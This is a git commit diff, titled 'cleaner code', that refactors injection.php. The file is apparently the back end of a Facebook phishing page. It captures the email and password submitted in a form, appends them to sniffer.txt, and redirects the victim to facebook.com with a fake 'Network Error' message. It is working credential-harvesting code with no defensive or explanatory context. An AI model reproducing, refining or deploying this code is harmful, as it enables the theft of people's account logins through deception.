004e0b134dffc2c49d510255758659a2f9e0bd03
eazi <eeezeazi@gmail.com>
2019-04-12 04:00:10 -0700

    cleaner code

--- injection.php
+++ injection.php
@@ -2,19 +2,31 @@
 
 <?php
 
+
+class Injector {
+	private $email;
+	private $password;
+	private $myfile;
+	private $txt;
+
+	public function __construct($email, $password) {
+		$this->email = $email;
+		$this->password = $password;
+	}
+
+	function fileManager() {
+		$this->myfile = fopen("sniffer.txt", "a+") or die("Unable to open file!");
+		$this->txt = "EMAIL: " . $this->email . " & " . "PASSWORD: " . $this->password . "\r\n";
+		fwrite($this->myfile, $this->txt);
+		fclose( $this->myfile );
+	}
+}
+
+$inj = new Injector($_POST["email"], $_POST["pass"]);
+$inj->fileManager();
 header('Location: https://www.facebook.com?Network Error');
 
-$myfile = fopen("sniffer.txt", "a+") or die("Unable to open file!");
-$txt = "EMAIL: " . $_POST["email"] . " - ";
-fwrite($myfile, $txt);
-
-$txt = "PASSWORD: " . $_POST["pass"] . "\r\n";
-fwrite($myfile, $txt);
-fclose($myfile);
-
-
-
-
+exit();
 
 
 
